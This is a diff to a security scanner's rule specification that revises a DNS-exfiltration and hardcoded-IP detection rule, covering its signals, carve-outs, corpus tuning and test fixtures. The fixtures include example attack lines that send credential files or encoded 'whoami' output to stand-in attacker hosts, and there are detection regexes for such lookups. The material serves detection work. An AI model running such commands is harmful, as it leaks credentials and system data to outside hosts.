@@ -252,11 +252,15 @@ The motivating example. Regex-only misses paraphrase; the fix is a **family + T3
 - **Confidence:** POST of tainted secret/file → 0.9 (correlate SG-TAINT-003/004); generic POST → 0.5.
 - **Fixtures:** TP: `requests.post(EVIL, data=open(os.path.expanduser('~/.aws/credentials')).read())`. FP: `requests.post(DECLARED_API, json={"ok":true})`.
 
-### SG-NET-005 — Hardcoded IP / non-allowlisted host / DNS-exfil  (AST01, medium)
-- **Signals:** literal public IPv4/IPv6 in code; DNS-exfil shape (data encoded into subdomain labels: `<hex>.<hex>.attacker.tld` with many labels, or `dig $(cmd).evil`). 
-- **FP carve-outs:** private/loopback ranges handled by SG-SSRF (different rule); public DNS resolvers (`8.8.8.8`, `1.1.1.1`) as config → low; CDN IPs in lockfiles.
-- **Confidence:** DNS-exfil shape 0.8; bare public IP 0.4.
-- **Fixtures:** TP: `nslookup $(whoami | xxd -p).exfil.evil`. FP: `resolver = "8.8.8.8"`.
+### SG-NET-005 — DNS exfiltration / hardcoded IP endpoint  (AST01/AST06, medium) — **implemented** (`core-network`)
+- **Signals (shipped):** four leaves. (1) command substitution inside a DNS lookup — `dig|nslookup|drill` **at a command position** (line start, or after `;`/`&`/`|`) followed within 60 chars by `$(…)` or a backtick (0.9); (2) data encoded into subdomain labels — `([0-9a-f]{8,}\.){2,}<host>.<tld>` (0.9); (3) a lookup fed from a command through a pipe — `whoami|hostname|id|env|cat … | dig` (0.9); (4) an IPv4-literal URL endpoint (0.6).
+- **Scope, decided by corpus measurement.** Across 240 skills the *only* `dig`/`nslookup` uses are `dig example.com` / `nslookup example.com` in documentation — no command substitution anywhere — and **every** IPv4-literal URL is `127.0.0.1` (dev servers). So the covert-channel shape is high-signal (0 hits) and the IP form needs the loopback/private carve-out to be usable at all.
+- **The bare-public-IP signal from the original spec is deliberately not shipped.** At the specified 0.4 it can never emit on a `scripts`/`configs` target (no +0.15 instruction bonus, and 0.4 < the 0.5 threshold), so it would have been dead code. The IPv4 form ships only as a **URL endpoint** at 0.6, where a documentary keyword still sinks it — the right outcome for an IP quoted in prose.
+- **FP carve-outs:** loopback, private (RFC1918) and link-local addresses are suppressed — SG-SSRF-001 owns link-local metadata, and `127.0.0.1` is the corpus's only IP-URL form; public resolvers (`8.8.8.8`, `1.1.1.1`, `9.9.9.9`) configured as resolvers are not exfiltration; `/path/to/` placeholders.
+- **Severity follows this document's `medium`,** not the "exfil is high" instinct — deviating from the authority spec needs its own decision, not a side effect of implementation.
+- **Corpus tuning — 24 → 0.** The first draft of leaf (1) used a bare word boundary over `dig|nslookup|host|drill` plus "`$(` or backtick", and drew **24 findings across the corpus, flipping 5 skills pass → warn**. Every hit was markdown prose: ``host: env[`${p}SMTP_HOST`]``, ``host's hooks dir (e.g. `.claude/hooks/`)``, `host=$(uname -n)`. Two causes — `host` is an ordinary English noun, and a backtick is markdown formatting, not only shell substitution. Dropping `host` and requiring a command position fixed both; those three strings are now `false` rows in the test. **Lesson: the prevalence measurement only covers the pattern you actually measured** — leaf (1) grew a backtick alternative *after* the corpus grep, and that addition is what broke it.
+- **Corpus:** 0 findings / 240, verdicts unchanged (209/22/9).
+- **Fixtures:** TP `testdata/malicious/setup.sh` (`nslookup $(whoami | xxd -p).beacon.attacker.test`). FP: `dig example.com`, `curl http://127.0.0.1:3000/health`, `resolver = "8.8.8.8"`. See `TestDNSExfilCoversCovertChannel` (5 TP, 6 benign).
 
 ### SG-NET-006 — Listener / bind-all  (AST01/AST06, high) — **implemented** (`core-network`)
 - **Signals:** bind to `0.0.0.0` / `::`, and reverse-shell idioms across the common families —
